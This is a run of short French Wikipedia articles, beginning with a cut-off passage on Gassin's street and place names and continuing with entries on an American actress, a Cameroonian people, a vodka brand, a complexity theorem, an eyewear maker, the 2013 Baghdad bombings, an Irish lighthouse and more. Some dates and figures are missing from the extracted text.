Le quartier de La Gare et le Sentier de la Gare rappellent l’existence d’une halte ferroviaire à Gassin. Elle se trouvait sur la ligne reliant Hyères et Saint-Raphaël, qui fonctionna de 1890 à la fin des années 1940. Le quartier se situe dans la plaine, à l’ouest du village ; le sentier de la Gare relie ces deux points.
C’est le seul souvenir toponymique qu’a laissé le rail à Gassin : il a existé une ligne de tramway reliant Cogolin à Saint-Tropez, qui desservait notamment la gare de la Foux.
Les noms des voies privées.
Le développement de Gassin avec le tourisme a conduit à la création de lotissements et de parcs privés qui se sont dotés de voies. Dans tous les cas connus, des choix consensuels ont été faits avec des noms d’animaux, de peintres du passé ou de clubs de golf.
Les peintres de Saint-Martin.
L’ensemble des voies du hameau de Gassin porte le nom de peintres du courant impressionniste : avenue Paul Cézanne, allée Edgar Degas, allée Paul Gauguin, allée Armand Guillaumin, allée Claude Monet, allée Berthe Morisot, allée Camille Pissarro, avenue Auguste Renoir, allée Alfred Sisley, allée Henri de Toulouse-Lautrec et allée Vincent van Gogh.
Le golf.
Les voies de la partie résidentielle du golf international de Gassin sont nommées d’après les plus importants clubs de golf mondiaux et les villes qui les accueillent : avenue Augusta National Golf Club, avenue Carnoustie, avenue de Chantilly, avenue Royal Saint-Georges, avenue Sotogrande, avenue Saint-Andrews et avenue .
Les quartiers résidentiels du bord de mer.
Entre la Berle et la Méditerranée, différents quartiers résidentiels modernes sont apparus.
Au nord du vaste quartier résidentiel de Sinopolis, quartier dont l’origine est inconnue, renvoyant étymologiquement à la « cité chinoise », les noms de rue sont ceux de divers oiseaux : avenue des Sansonnets, avenue des Pinsons, avenue des Rossignols, avenue des Bouvreuils, avenue des Colibris, avenue des Hirondelles, avenue des Mésanges, avenue des Loriots, avenue des Canaris et allée du Vivier. Au sud, quatre écrivains du XIXe et du XXe siècle sont honorés : Guillaume Apollinaire, Jean Cocteau, Colette, Frédéric Mistral et Paul Verlaine.
Le boulevard de Provence traverse ce quartier du nord au sud ; il est coupé par l’avenue du Rivalet, l’allée du Vallat (voir le chapitre sur les hydronymes) et aboutit à l’avenue des Patapans (voir le chapitre sur les sobriquets). À l’ouest de ce dernier se trouve l’allée de la Chêneraie et la Rouvraie (voir le chapitre sur la flore) au sens très proche. Avec le boulevard de Provence, deux autres voies structurent le quartier : le boulevard des Crêtes, où se trouve notamment la villa Belrose. L’avenue de Bello Visto tire son nom du provençal pour rappeler la "belle vue". 
Certains noms sont étudiés plus haut : allée du Ponant, avenue du Val de Bois, allée des Bayes, allée des Pins Bouans, d’autres sont inconnus : avenue des Lagardes, place du Serre, allée du Haut-Treizain, allée du domaine du Treizain.
Les télécommunications.
Sur le site des Barri de Gassin, le ministère de l’Écologie, de l’Énergie, du Développement durable et de l’aménagement du territoire dispose d’un site à Gassin, appelé Radio-Phare. La piste du Radio-Phare le rejoint depuis "la Rouillère." (voir "Barri de Gassin").
Origine inconnue ou incertaine.
L’origine de plusieurs toponymes est hui incertaine :
Voir aussi.
Bibliographie.
Domaines spécifiques.
Hagiotoponymes
Odonymes
Hydronymes
Onomastique et anthroponymie

</doc>
<doc id="10575460" url="https://fr.wikipedia.org/wiki?curid=10575460" title="Claudia Dell">
Claudia Dell

Claudia Dell Smith — née le à San Antonio (Texas), morte le à Los Angeles (Californie) — est une actrice américaine, connue comme Claudia Dell.
Biographie.
Au théâtre, Claudia Dell se produit trois fois à Broadway, dans les revues "Gay Paree of 1925" (1925-1926) et "Ziegfeld Follies of 1927" (musique d'Irving Berlin, 1927-1928, avec Eddie Cantor et Claire Luce), et enfin dans la comédie musicale " (musique de George Gershwin et Sigmund Romberg, 1928, avec Marilyn Miller et Frank Morgan).
Puis elle contribue au cinéma à quarante-deux films américains (ou en coproduction) sortis à partir de 1929, dont des westerns de série B, tel " de Benjamin Stoloff en 1932, avec Tom Mix et Zasu Pitts.
Mentionnons également "Sweet Kitty Bellairs" d'Alfred E. Green (1930, avec Walter Pidgeon et Ernest Torrence), "Fifty Million Frenchmen" de Lloyd Bacon (1931, avec Ole Olsen et Chic Johnson), "Cléopâtre" de Cecil B. DeMille (1934, avec Claudette Colbert et Warren William), ainsi que "Casbah" de John Cromwell (1938, avec Charles Boyer et Hedy Lamarr).
Son dernier film — de la série cinématographique consacrée à Charlie Chan — est "Black Magic" de Phil Rosen (avec Sidney Toler et Mantan Moreland), sorti en 1944, après quoi elle se retire définitivement de l'écran (hormis de rares apparitions à la télévision ultérieurement, dans une série en 1952 et quelques émissions).
En 1928, elle fait l'objet de tests pseudo-scientifiques conduits par le psychologue William Moulton Marston sur la différence d'émotivité entre brune et blonde regardant des films d'amour.

</doc>
<doc id="10575465" url="https://fr.wikipedia.org/wiki?curid=10575465" title="Konabembe (peuple)">
Konabembe (peuple)

Les Konabembe (ou Kounabembe, Nkonabeeb, Konabem, Kunabeeb, Nkumabem) sont une population du Cameroun vivant dans la Région de l'Est et le département du Boumba-et-Ngoko, notamment dans l'arrondissement de Yokadouma, dans des localités telles que Bangué, Gribé, Madjoué, Massea ou Ngatto Nouveau.
Langue.
Ils parlent, une langue bantou du groupe makaa-njem.

</doc>
<doc id="10575467" url="https://fr.wikipedia.org/wiki?curid=10575467" title="Belvedere (vodka)">
Belvedere (vodka)

Belvedere est une marque de vodka polonaise élaborée à base de seigle, elle est produite et distribuée par LVMH. La distillerie se situe à Żyrardów en Pologne. 
Création et origines.
Implantée en Pologne depuis 1993, son nom vient de l'ancienne communauté italienne établie en Pologne qui après avoir bu le breuvage s'est exclamé « ma che Belvedere » en parlant des femmes qui devinrent toutes ravissantes.
Cette marque est une filiale du groupe d'entreprises de luxe LVMH. Elle est dirigée par Rodney Williams depuis le .
La vodka Belvedere est selon cette société élaborée à partir de seigle d’or de Dankowskie provenant de la région de Mazovie et d'eau de source issue par les puits artésiens de la marque. Elle est distillée quatre fois dans de petits alambics qui permettent d’obtenir une eau-de-vie à 96,4 %, laissée au repos avant assemblage avec l’eau pure pour atteindre la température de 40 degrés.
Elle a obtenu la médaille d'or dans la catégorie Vodka Neutral à l'International Wine &amp; Spirit Competition en 2013.
Marketing.
Belvedere signifierait "Belle-à-voir" et fait également référence au Belwederski, le palais présidentiel polonais situé à Varsovie, représenté sur la bouteille.

</doc>
<doc id="10575468" url="https://fr.wikipedia.org/wiki?curid=10575468" title="Konabembe">
Konabembe

Konabembe peut désigner :

</doc>
<doc id="10575471" url="https://fr.wikipedia.org/wiki?curid=10575471" title="Rue Percée-Saint-Antoine">
Rue Percée-Saint-Antoine



</doc>
<doc id="10575472" url="https://fr.wikipedia.org/wiki?curid=10575472" title="Raymonde Hebraud-Carasco">
Raymonde Hebraud-Carasco



</doc>
<doc id="10575473" url="https://fr.wikipedia.org/wiki?curid=10575473" title="Keith Devlin">
Keith Devlin

Keith J. Devlin est un mathématicien et vulgarisateur britannique. Depuis 1987, il vit aux États-Unis. Il possède la double nationalité américaine et britannique.

</doc>
<doc id="10575478" url="https://fr.wikipedia.org/wiki?curid=10575478" title="Église Saint-Michel-et-Saint-Gabriel de Banatsko Aranđelovo">
Église Saint-Michel-et-Saint-Gabriel de Banatsko Aranđelovo

Léglise Saint-Michel-et-Saint-Gabriel de Banatsko Aranđelovo (en serbe cyrillique : ; en serbe latin : ) est une église orthodoxe serbe située à Banatsko Aranđelovo, dans la province autonome de Voïvodine, dans la municipalité de Novi Kneževac et dans le district du Banat septentrional en Serbie. Elle est inscrite sur la liste des monuments culturels protégés de la république de Serbie (identifiant SK 1691).
Présentation.
L'église, dédiée aux archanges saint Michel et saint Gabriel, a été construite entre 1822 et 1827. Le clocher de l'église, haut d'environ , a été érigé en 1857.
L'iconostase et les peintures murales ont été peintes par Nikola Aleksić en 1839. Les fresques des voûtes et les icônes des murs ont été peintes par Stevan Aleksić en 1908.

</doc>
<doc id="10575492" url="https://fr.wikipedia.org/wiki?curid=10575492" title="Rue du Cimetière-Saint-André-des-Arts">
Rue du Cimetière-Saint-André-des-Arts



</doc>
<doc id="10575493" url="https://fr.wikipedia.org/wiki?curid=10575493" title="Théorème de hiérarchie en temps déterministe">
Théorème de hiérarchie en temps déterministe

Le théorème de hiérarchie en temps déterministe est un énoncé de la théorie de la complexité, un domaine de l'informatique théorique. Informellement, le théorème dit qu'avec plus de temps, une machine déterministe peut résoudre plus de tâches. C'est l'un des . 
Contexte.
Le théorème parle en particulier de machines de Turing déterministes. On note DTIME("f") l'ensemble des problèmes de décision qui peuvent être décidés par une telle machine avec une complexité en temps O("f"("n")), où "n" est la taille de l'entrée.
Énoncé.
Le théorème de hiérarchie en temps déterministe est le suivant :
Théorème proches.
Il existe d'autres . Par exemple, il existe d'autres théorèmes de hiérarchie en temps pour les machines non déterministes. Il existe aussi des théorèmes pour la complexité en espace.
Histoire.
Le théorème de hiérarchie en temps déterministe est dû à Richard E. Stearns et Juris Hartmanis en 1965. Le résultat a été amélioré par F. C. Hennie et Richard E. Stearns en améliorant l'efficacité de la machine de Turing universelle.

</doc>
<doc id="10575494" url="https://fr.wikipedia.org/wiki?curid=10575494" title="Newell (Iowa)">
Newell (Iowa)

Newell est une ville du comté de Buena Vista, en Iowa, aux États-Unis. Elle est fondée en 1870, en tant que gare sur la ligne "Dubuque and Sioux City Railroad" et est nommée en hommage à un membre de la compagnie de chemin de fer Illinois Central Railroad. Elle est incorporée le .

</doc>
<doc id="10575501" url="https://fr.wikipedia.org/wiki?curid=10575501" title="Institut français en Inde">
Institut français en Inde

L' Institut français en Inde (IFI) fait partie du réseau mondial des instituts français. L'antenne de Delhi est l'unique d'Inde, l'Institut français de Pondichéry étant un institut de recherche et non d'échange culturel et linguistique.
Historique.
L’Institut français de New Delhi a été inauguré le par Mr Xavier Darcos, alors président de l'Institut français, dans le cadre d’une réforme mondiale du réseau culturel et de coopération du ministère français des Affaires étrangères et européennes initiée par la loi du 27 juillet 2010, en remplacement des activités culturelles françaises qui étaient jusque-là réunies au sein de l'association Culturesfrance.
Cette réorganisation a apporté une meilleure unité et une plus grande simplicité de gestion. Les services de coopération universitaire, éducative, linguistique et culturelle de l’Ambassade de France ont ainsi fusionné pour devenir l’Institut français. Ils entretiennent des liens étroits avec le Consulat général ainsi que le bureau de l'Alliance française du pays, les autorités nationales et locales et d'autres institutions francophones comme les lycées et écoles français(es). 
Le Lycée français de Delhi et le Centre de Sciences Humaines partagent les locaux de l'Institut, qui s'étendent sur un terrain arboré à proximité immédiate de l'hôtel cinq étoiles Taj Mahal, du cimetière Parsi et à quelques centaines de mètres seulement du célèbre Rajpath de New Delhi. 
Rôle éducatif.
Le but premier de l'Institut est de proposer des cours, formations et examens de français à un public aussi large que possible. L'IF New Delhi est accrédité pour faire passer et délivrer différentes certifications internationales : le DELF, le DALF ou le test de connaissance du français (TCF).
L'Institut français joue un rôle de médiateur entre le monde universitaire français et les étudiants indiens, notamment en proposant des journées de sensibilisation à la culture et à la langue françaises et en abritant l'organisme Campus France. En 2011, c'était ainsi 2500 étudiants indiens qui choisissaient la France pour leurs études supérieures par cette voie, un chiffre en constante augmentation.
Des bourses d'études pour l'encouragement aux études supérieures sont proposées par l'ambassade de France et le ministère des Affaires étrangères aux citoyens français résidents en Inde, principalement aux niveaux maîtrise et doctorat.
En outre, l'IF de New Delhi créé et soutien des initiatives innovantes tels que Salledesprofs.com, le premier réseau social de professeurs de français en Inde, ou encore la création d'un "bachelor" en éducation option français depuis 2013, avec la coopération d'universités indiennes et françaises.
Activités culturelles.
Le centre culturel de l'institut participe à la scène culturelle locale et nationale, en créant des centaines d'évènements annuels. Ses activités s'opèrent également en ligne, par des projets réguliers d'encouragement à la culture. L'institut dispose d'une salle de conférence convertible en salle de cinéma, d'une galerie d'exposition, d'un club de lecture ainsi que d'un espace pour les plus jeunes.
L'IF participe également à des évènements externes, dans le cadre de la promotion de la culture et des échanges entre la France et l'Inde, et développe des partenariats avec d'autres entités culturelles, gouvernementales ou non-gouvernementales. Elle ainsi organisé ou accueilli plusieurs événements autour du livre et de l'édition francophone ainsi que des festivals de cinéma et des conférences depuis le début des années 2000.
Voir aussi.
Établissements scolaires français en Inde :

</doc>
<doc id="10575507" url="https://fr.wikipedia.org/wiki?curid=10575507" title="Safilo Group">
Safilo Group

Safilo Group S.p.A., acronyme de Società Azionaria Fabbrica Italiana Lavorazione Occhiali, est une société italienne spécialisée dans la production et la distribution de lunettes de vue, de soleil et de sport, lunettes et casques de ski et de vélo, dont le siège administratif est à Padoue (Vénétie), en Italie.
La société est cotée à la Bourse de Milan depuis décembre 2005, où elle est présente dans l'indice FTSE Italia Small Cap sous le code SFL. Elle compte cinq usines dans le monde :
Histoire.
Les origines des activités du Groupe Safilo SpA remontent à 1934 lorsque Guglielmo Tabacchi acheta le premier complexe industriel italien de production de verres et de montures, créé en 1878 à Calalzo di Cadore, dans la province de Belluno (Vénétie), et fonda la "Società Azionaria Fabbrica Italiana Lavorazioni Occhiali" Safilo SpA, l'entreprise manufacturière la plus ancienne de lunettes dans l'industrie optique.
En 1974, après le décès du fondateur, l'entreprise est dirigée par ses trois fils, Giuliano, Vittorio et Dino Tabacchi.
En 1996, Safilo SpA rachète le fabricant américain de lunettes de sport Smith Sport Optics INC ainsi que la société autrichienne Carrera Optyl.
Fin 2000, les frères Tabacchi ayant des visions stratégiques différentes, Vittorio rachète les parts de ses deux frères à un prix élevé, prenant ainsi le contrôle de l'entreprise en 2001. Lors de cette opération, il s’endette lourdement. Quatre ans plus tard, fin 2005, Vittorio Tabacchi (épaulé par ses enfants Massimiliano et Samantha) introduit la société Safilo Group SpA en bourse avec des dettes d'environ 710 millions d'euros. En 2009, une recapitalisation robuste s'impose et le fonds néerlandais "Hal Investments" (entièrement contrôlé par HAL Trust) devient l'actionnaire de référence, d'abord avec 37,2% , puis avec 42,2%. La participation de Vittorio Tabacchi tombe à un peu plus de 9 %.
En 2012, Safilo Group SpA rachète la société Polaroid Eyewear, leader dans la technologie de l'optique et des verres polarisés, ainsi qu'un fabricant et distributeur mondial d'articles optiques.
En octobre 2013, la Suissesse Luisa Delgado est nommée PDG. L'entreprise compte , dont au siège de Padoue. Les centres de distribution sont passés de 20 à 6. En 2014, Safilo SpA fête ses 80 premières années d'histoire.
En février 2018, le pacte d'actionnaires signé en septembre 2013 entre Delgado et Multibrands Italy BV est dissout. En janvier 2019, après une augmentation du capital de la société, la participation de Multibrands Italy BV atteint 49,8%. En 2020, Safilo Group SpA rachète les sociétés Privé Revaux et Blenders Eyewear, deux marques américaines en croissance rapide et fortement orientées vers le numérique.
Safilo Group SpA est le fabricant numéro deux mondial en chiffre d'affaires derrière EssilorLuxottica et devant Kering Eyewear jusqu'en 2022 où il se voit dépassé par ce dernier. Avant la création de Kering Eyewear, Safilo fabriquait des lunettes pour le groupe de luxe Kering.
Safilo possède la licence pour les marques Tommy Hilfiger, Carrera, Hugo Boss, Missoni, Levi's ou Isabel Marant.
En , le groupe Safilo a annoncé l'acquisition de 61,34% de la société basée à Miami Prive Goods. Le prix de la transaction est estimé à 61,6 millions d’euros. Par la suite, Safilo fait l'acquisition de deux marques américaines, Blenders Eyewear et Privé Revaux.
Les marques de Safilo Group SpA.
Safilo Group SpA dispose de plus de 30 marques principales dont :

</doc>
<doc id="10575511" url="https://fr.wikipedia.org/wiki?curid=10575511" title="Théorème de hiérarchie">
Théorème de hiérarchie

En informatique théorique, et plus précisément en théorie de la complexité, il existe plusieurs théorème de hiérarchie. Ils expriment tous l'idée, qu'avec plus de ressources, on peut résoudre strictement plus de problèmes. 
Les principaux sont :

</doc>
<doc id="10575512" url="https://fr.wikipedia.org/wiki?curid=10575512" title="Charliehebdo.wordpress.com">
Charliehebdo.wordpress.com



</doc>
<doc id="10575518" url="https://fr.wikipedia.org/wiki?curid=10575518" title="Forêt nationale de San Bernardino">
Forêt nationale de San Bernardino

La forêt nationale de San Bernardino (en anglais "San Bernardino National Forest"), est une forêt nationale américaine située dans le Sud de la Californie. Couvrant , elle s'étend dans les comtés de Riverside et San Bernardino. Créée en 1907, l'aire protégée est gérée par le Service des forêts des États-Unis.

</doc>
<doc id="10575519" url="https://fr.wikipedia.org/wiki?curid=10575519" title="San Bernardino National Forest">
San Bernardino National Forest



</doc>
<doc id="10575527" url="https://fr.wikipedia.org/wiki?curid=10575527" title="Jean d'Avaugour">
Jean d'Avaugour

Jean d'Avaugour (né en 1291 - mort le ) est un ecclésiastique breton qui fut évêque de Saint-Brieuc en 1320 puis évêque de Dol en 1328.
Biographie.
Jean d'Avaugour, fils d'Henri II d'Avaugour, appartient à l'illustre famille d'Avaugour issue des comtes de Penthièvre et par eux des anciens ducs de Bretagne. Il est également un lointain parent de la reine de France Jeanne de Bourgogne, l'épouse de Philippe V de France, et surtout l'oncle de l'héritière de sa lignée Jeanne d'Avaugour qui avait épousé Guy de Penthièvre le frère du duc Jean III de Bretagne.
Diacre et chantre de Tréguier, il est nommé évêque par le Pape le après la mort d'Alain de Lamballe avec une dispense d'âge car il n'a que 29 ans. Il participe aux États de Bretagne en 1315 et il est transféré à l'évêché de Dol le où il meurt le .

</doc>
<doc id="10575532" url="https://fr.wikipedia.org/wiki?curid=10575532" title="Matej Mináč">
Matej Mináč

Matej Mináč, né le à Bratislava (Tchécoslovaquie, actuellement en Slovaquie), est un réalisateur et scénariste slovaque.
Biographie.
Matej Mináč a notamment réalisé trois films sur Nicholas Winton, un Britannique qui a organisé le sauvetage de 669 enfants juifs de la Tchécoslovaquie occupée par l'Allemagne à la veille de la Seconde Guerre mondiale. Cette opération sera plus tard connue sous le nom de "Czech Kindertransport".
Les trois films sont le drame "All My Loved Ones" (1999), le documentaire "" (2002) qui a remporté un Emmy Award, et le documentaire "La Famille de Nicky" (2011).
Matej Mináč est le fils de la photographe Zuzana Mináčová.

</doc>
<doc id="10575542" url="https://fr.wikipedia.org/wiki?curid=10575542" title="Communauté de communes du canton de Rosheim">
Communauté de communes du canton de Rosheim



</doc>
<doc id="10575544" url="https://fr.wikipedia.org/wiki?curid=10575544" title="Plage de la Malva-Rosa">
Plage de la Malva-Rosa

La plage de la Malvarrosa () est une plage de Valence (Espagne). Son nom ainsi que celui du quartier où elle se trouve, date de 1848.
Présentation.
Félix Robillard, qui à l’époque était le jardinier général du jardin botanique de Valence, acheta cette zone marécageuse afin de la rendre habitable. Pour ce faire, il l’assécha et y planta de nombreuses espèces végétales, parmi elles le geranium odoratissimun, appelé aussi Malva-Rosa.
À l’époque, la plage de la Malva-Rosa servait de port de pêche et de commerce et au fur et à mesure, elle est devenue un lieu propice pour les résidences secondaires de la bourgeoisie. De grands noms tels que Joaquín Sorolla et Vicente Blasco Ibáñez venaient y passer leurs vacances d’été. 
La plage de la Malva-Rosa se démarque grâce à ses maisons typiques face à une mer d'une longueur de et d’une largeur moyenne de 135 mètres.
Actuellement, sa promenade maritime représente une vaste zone animée, touristique et fournie en restaurants et boutiques.
Les magasins d’époque d’alimentation, de vêtements, de linge de maison ou encore ceux qui confectionnaient artisanalement les costumes traditionnels de Valenciennes ont peu à peu, à cause de rachats effectués par de riches investisseurs, disparu afin de laisser place à des épiceries, des restaurateurs rapides et des boutiques discount.
De nombreux postes de secours sont parsemés tout au long de la plage et cette dernière dispose même d’un espace de baignade adapté aux personnes à mobilité réduite.
Géographie.
À proximité du centre-ville, la plage accueille chaque année de nombreuses activités :
Malvarrosa (nom officiel en valencien la Malva-Rosa) est un quartier de la ville de Valence (Espagne) appartenant au quartier de Poblados Marítimos. 
Ce quartier se situe à l’est de la ville et se termine à la frontière de la commune d'Alboraia, à l’est avec la mer Méditerranée, au sud avec le Cabañal-Cañamelar et Beteró puis à l’ouest avec La Carrasca. En 2009, la Malva-Rosa comptait . 
Il s'agit de la plage urbaine la plus connue de cette ville, au nord de la plage de Las Arenas et à deux pas du centre de Valence. Spacieuse et ouverte, elle accueille chaque année un festival aérien pendant lequel des avions du monde entier réalisent de magnifiques acrobaties.
Histoire.
Ce quartier ainsi que la plage de la Malva-Rosa ont reçu le nom de la plante, qui, autrefois, recouvrait toute la zone. Néanmoins, elle est souvent confondue avec les plages du Cabañal et des Arenas.
Situé à sept kilomètres du centre-ville, ce quartier était autrefois un quartier de pêcheurs. Le long de la plage bénéficie d'une zone très dynamique et touristique avec de nombreuses boutiques et de nombreux restaurants. De plus, elle constitue l'une des zones de loisirs les plus fréquentées de la ville de Valence.
Au cœur de cette promenade se trouve la maison qu’occupait Vicente Blasco Ibáñez.
Le peintre Joaquín Sorolla a beaucoup représenté cette plage dans ses toiles, notamment dans son tableau "Les Trois Voiles". "Les Trois Voiles" a été peint sur la plage durant l'été de 1903, année qui fut l'une des plus prolifiques de l'artiste comme il l'explique dans sa correspondance à son ami Pedro Gil Moreno de Mora :

</doc>
<doc id="10575550" url="https://fr.wikipedia.org/wiki?curid=10575550" title="Franciscaines de Sainte Marie des Anges">
Franciscaines de Sainte Marie des Anges

Les Franciscaines de Sainte Marie des Anges forment une congrégation religieuse féminine adoratrice et missionnaire de droit pontifical.
Histoire.
C'est à l'initiative de l'évêque d'Angers, Charles-Émile Freppel, que la congrégation est fondée par le capucin Chrysostome de Lyon (1828-1895) et Caroline Rurange (1833-1913) pour la prise en charge des orphelins de la Guerre franco-prussienne. Le à Angers, le Père Chrysostome remet le cordon franciscain à Caroline et deux compagnes. Les fondateurs obtiennent de l'évêque l'autorisation d'ajouter l'adoration perpétuelle comme but de la congrégation.
Le 2 août 1873, Caroline Rurange fait sa profession religieuse sous le nom de Marie-Chrysostome de la Croix. Le 12 août suivant, les sœurs s'installent dans le prieuré de l'Esvière près d'Angers, lieu d'un pèlerinage à la Vierge sous le vocable de Notre-Dame de Sous-Terre.
L'institut se développe rapidement tant en France qu'à l'étranger ; les sœurs ouvrent une maison en Suisse en 1885 et l'année suivante en Angleterre. Elles ouvrent une maison à Hyères en 1887 pour acclimater les religieuses destinées aux missions et servant de maison de repos aux prêtres jusqu'en 1983. La première fondation hors de l'Europe se fait dans l'État du Rajputana (aujourd'hui incorporé dans l'État du Rajasthan en Inde). Le Père Chrysostome connaît les besoins de la préfecture apostolique du Rajputana car la mission est confiée aux religieux Capucins ; sept religieuses y sont envoyées en 1892. Elles contribuent à la formation de congrégations autochtones (les servantes du Seigneur d'Ajmer et les sœurs missionnaires d'Ajmer).
La congrégation reçoit du pape Pie IX le décret de louange le et l'agrégation aux Frères mineurs capucins le , l'approbation finale de leurs constitutions est accordée le .
Activités et diffusion.
Les sœurs se consacrent à l'adoration eucharistique, à l'enseignement, à l'assistance aux malades et aux missions.
Elles sont présentes en:
La maison-mère est à Wickham dans le comté d'Hampshire.
En 2017, la congrégation comptait 424 sœurs dans 69 maisons.

</doc>
<doc id="10575552" url="https://fr.wikipedia.org/wiki?curid=10575552" title="Fussstein">
Fussstein

Le est une montagne qui s’élève à d’altitude dans les Alpes de Zillertal, en Autriche.

</doc>
<doc id="10575562" url="https://fr.wikipedia.org/wiki?curid=10575562" title="Matej Minac">
Matej Minac



</doc>
<doc id="10575579" url="https://fr.wikipedia.org/wiki?curid=10575579" title="Alexander Dinelaris Jr.">
Alexander Dinelaris Jr.

Alexander Dinelaris Jr. est un scénariste et un producteur de cinéma, et également auteur de livrets de comédies musicales, américain né le à New York (État de New York).
Biographie.
Après une jeunesse difficile passée à New York, il obtient une bourse pour la Barry University à Miami (Floride), bourse qui selon ses propres termes a changé sa vie.

</doc>
<doc id="10575584" url="https://fr.wikipedia.org/wiki?curid=10575584" title="François de Fossa (homonymie)">
François de Fossa (homonymie)

François de Fossa peut désigner :

</doc>
<doc id="10575586" url="https://fr.wikipedia.org/wiki?curid=10575586" title="Attentats du 25 décembre 2013 à Bagdad">
Attentats du 25 décembre 2013 à Bagdad

Les attentats du 25 décembre 2013 à Bagdad sont une série d'attaques terroristes perpétrées le dans la capitale irakienne. Ils font 40 morts et 60 blessés. Trente-cinq personnes sont notamment tuées sur un marché du sud de la ville, à proximité d'une église. 
Contexte.
La communauté chrétienne d'Irak a diminué de moitié depuis l'invasion américaine dix ans plus tôt, à cause des violences interconfessionnelles qui déchirent le pays depuis cette date. Ils étaient plus d'un million à l'époque de Saddam Hussein, pour moins de restants en 2013.
En 2010, une cathédrale catholique syriaque de la ville avait déjà été victime d'une prise d'otages sanglante qui avait fait plus de 60 morts, dont deux prêtres.
La situation s'était améliorée depuis et l'essentiel des troupes de la coalition quittent le pays en 2011 mais l'intensification de la guerre civile syrienne à partir de 2012 donne un nouveau souffle aux groupes liés à Al-Qaida.
Déroulement.
Dans un premier temps, les agences de presse, relayant des sources sécuritaires, rapportent l'explosion d'une voiture piégée devant l'église Saint-Jean dans le quartier de Doura, dans le sud de la ville, au moment de la sortie d'une messe de Noël, ce qui évoque un attentat contre les chrétiens. Quelques heures plus tard, le gouvernement parle cependant de deux bombes qui auraient explosé sur un marché, à proximité de l'église mais sans que celle-ci soit la cible principale. Le quartier visé est un lieu pauvre où cohabitent chrétiens et musulmans. Cette deuxième version est appuyée par un prêtre assyrien et par le patriarche chaldéen, Louis-Raphaël Sako, qui affirme que la bombe .
Le même jour, une bombe explose sous les gradins d'un stade de football, tuant quatre personnes sont deux policiers. Une troisième bombe fait un mort et 3 blessés, toujours à Bagdad.
Bilan.
L'explosion sur le marché fait 35 morts et 56 blessés. Avec les victimes des deux autres attaques le bilan à Bagdad est de 40 morts et d'une soixantaine de blessés. Cette attaque clôt tragiquement une année où personnes ont été tués dans des violences à travers le pays, un bilan qui retrouve le niveau de celui de 2008, au plus fort de la guerre confessionnelle entre insurgés sunnites et chiites.

</doc>
<doc id="10575592" url="https://fr.wikipedia.org/wiki?curid=10575592" title="Talitres records">
Talitres records



</doc>
<doc id="10575594" url="https://fr.wikipedia.org/wiki?curid=10575594" title="Liste des mammifères en Corse">
Liste des mammifères en Corse

Cette liste commentée recense la mammalofaune en Corse. Elle répertorie les espèces de mammifères corses actuels et celles qui ont été récemment classifiées comme éteintes (à partir de l'Holocène, depuis donc ). Cette liste comporte 66 espèces réparties en dix ordres et 24 familles, dont une est « éteinte », une autre est « en danger critique d'extinction », deux sont « en danger », cinq sont « vulnérables », huit sont « quasi menacées » et deux ont des « données insuffisantes » pour être classées (selon les critères de la liste rouge de l'UICN au niveau mondial).
Elle contient au moins 23 espèces introduites sur ce territoire, qui sont plus ou moins bien acclimatées. Il peut contenir aussi des animaux non reconnus par la liste rouge de l' (six mammifères ici) et ils sont classés en « non évalué » : cela étant dû notamment au manque de données, à des espèces domestiques, disparues ou éteintes avant le . Il n'existe plus en Corse d'espèce de mammifère endémique (la Musaraigne endémique de Corse (') s'est éteinte vers le Moyen Âge central). Comme sous-espèce endémique, il y a par exemple le Chat sauvage corse (').

</doc>
<doc id="10575598" url="https://fr.wikipedia.org/wiki?curid=10575598" title="Un Italien en Amérique">
Un Italien en Amérique

Un Italien en Amérique ("") est un film italien d'Alberto Sordi sorti en 1967.

</doc>
<doc id="10575611" url="https://fr.wikipedia.org/wiki?curid=10575611" title="GrandVision">
GrandVision

GrandVision est une entreprise néerlandaise de distribution d’optique. Elle possède notamment les marques Grand Optical, Solaris et Générale d'Optique. La société a été créée en France par Daniel Abittan au début des années 1990 avec le lancement des enseignes Grand Optical et Générale d'Optique.
Histoire.
En 1997, GrandVision acquiert Vision Express présent notamment au Royaume-Uni.
En 2011, GrandVision fusionne avec Pearle Europe, créant un ensemble nommé GrandVision regroupant 4 000 boutiques pour un chiffre d'affaires de 2,5 milliards de dollars.
En 2015, GrandVision acquiert la chaîne d'opticiens For Eyes, présente aux États-Unis avec plus de 100 boutiques.
En , EssilorLuxottica annonce l'acquisition d'une participation de 76,72 % dans GrandVision, entreprise d'optique ayant plus de 7 400 boutiques, valorisant le groupe à 7,2 milliards d'euros.

</doc>
<doc id="10575618" url="https://fr.wikipedia.org/wiki?curid=10575618" title="Phare de Tory Island">
Phare de Tory Island

Le phare de Tory Island est un phare situé sur l'Île de Toraigh au large des côtes du Comté de Donegal (Irlande). Il est géré par les Commissioners of Irish Lights (CIL).
Histoire.
Les commissaires de port et les marchands de Sligo ont fait la demande à Trinity House d'un projet de phare sur l'île de Toraigh en . L'accord en a été donné sur la principe que ce phare, à sa mise en service, remplacerait celui d'Arranmore. Le phare et les bâtiments annexes ont été conçus par l'inspecteur et construits sous sa supervision. La lumière fut établie le . La tour ronde en maçonnerie, avec la lanterne et sa galerie, fait 27 m de haut, pour une élévation de la lumière à 40 m au-dessus du niveau de la mer. Un passage couvert la relie aux maisons des gardiens et le tout est entouré d'un mur de pierre. Depuis , la tour est peinte en noir avec une bande horizontale blanches, et la lanterne est blanche.
En 1972, quand la source lumineuse a été convertie en électricité, l'intensité de la lumière a été augmentée donnant une portée de 30 milles marins. La caractéristique de la lumière est restée la même depuis à quatre flashs blancs toutes les 30 secondes. La lentille dioptrique est de 1330 mm.
Un signal de brouillard a été établi en 1887. En il est devenu électrique et en il a été supprimé. Une balise-radio a été mise en service dès 1931, puis l'utilisation de la radiogoniomètrie a été remplacée par une technologie plus moderne. Celle-ci a été supprimée en 1999 pour être remplacée par un équipement de GPS différentiel. En , le phare a été transformé en exploitation automatique et les gardiens ont été retirés de la station. La station est depuis à la charge d'un opérateur via une liaison de télémétrie avec les services du CIL à Dun Laoghaire.
Ce phare fait partie des douze plus grands phares d'Irlande. Il marque l'entrée occidentale du Lough Swilly. Après restauration, les bâtiments annexes sont devenus des résidences de location de vacances. L'île est habitée et accessible par le ferry. Le phare est ouvert aux visiteurs depuis l'été 2015 et le ministère du tourisme subventionne l'accueil des touristes sur le site. Erigé sur une falaise verticale, il se trouve à environ 3 km au nord-est du village continental de Arryheernabin.

</doc>
<doc id="10575629" url="https://fr.wikipedia.org/wiki?curid=10575629" title="Susana Dujim">
Susana Dujim



</doc>
<doc id="10575630" url="https://fr.wikipedia.org/wiki?curid=10575630" title="Liste de films français sortis en 1972">
